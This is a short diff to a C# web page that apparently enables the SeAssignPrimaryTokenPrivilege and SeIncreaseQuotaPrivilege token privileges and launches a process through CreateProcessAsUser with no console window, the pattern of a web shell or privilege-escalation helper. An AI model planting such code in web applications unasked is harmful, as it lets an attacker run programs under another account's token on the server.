@@ -13,7 +13,8 @@
 	public const int SE_PRIVILEGE_ENABLED = 0x00000002;
 	public const int TOKEN_QUERY = 0x00000008;
 	public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
-	public const string SE_TIME_ZONE_NAMETEXT = "SeImpersonatePrivilege";
+	public const string ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryTokenPrivilege";
+	public const string INCREASE_QUOTA = "SeIncreaseQuotaPrivilege";
 	public const long SECURITY_MANDATORY_HIGH_RID =(0x00003000L);
 
 	public enum SID_NAME_USE
@@ -304,16 +305,25 @@
 	    tp.Count = 1;
 	    tp.Luid = 0;
 	    tp.Attr = SE_PRIVILEGE_ENABLED;
-	    if(!LookupPrivilegeValue(null, SE_TIME_ZONE_NAMETEXT, ref tp.Luid))
+	    if(!LookupPrivilegeValue(null, ASSIGN_PRIMARY_TOKEN, ref tp.Luid))
 	    {
-	        Response.Write("SeImpersonatePrivilege not found.");
+	        Response.Write("SeAssignPrimaryTokenPrivilege not found.");
 	        return;
 	    }
 
 	    if(!AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
 	    {
-	        Response.Write("SeImpersonatePrivilege could not be enabled.");
+	        Response.Write("SeAssignPrimaryTokenPrivilege could not be enabled.");
 	        return;
+	    }
+
+		TokPriv1Luid tp2;
+	    tp2.Count = 1;
+	    tp2.Luid = 0;
+	    tp2.Attr = SE_PRIVILEGE_ENABLED;
+		if(LookupPrivilegeValue(null, INCREASE_QUOTA, ref tp2.Luid))
+	    {
+	        AdjustTokenPrivileges(htok, false, ref tp2, 0, IntPtr.Zero, IntPtr.Zero);
 	    }
 
 		if (!CreateProcessAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi))
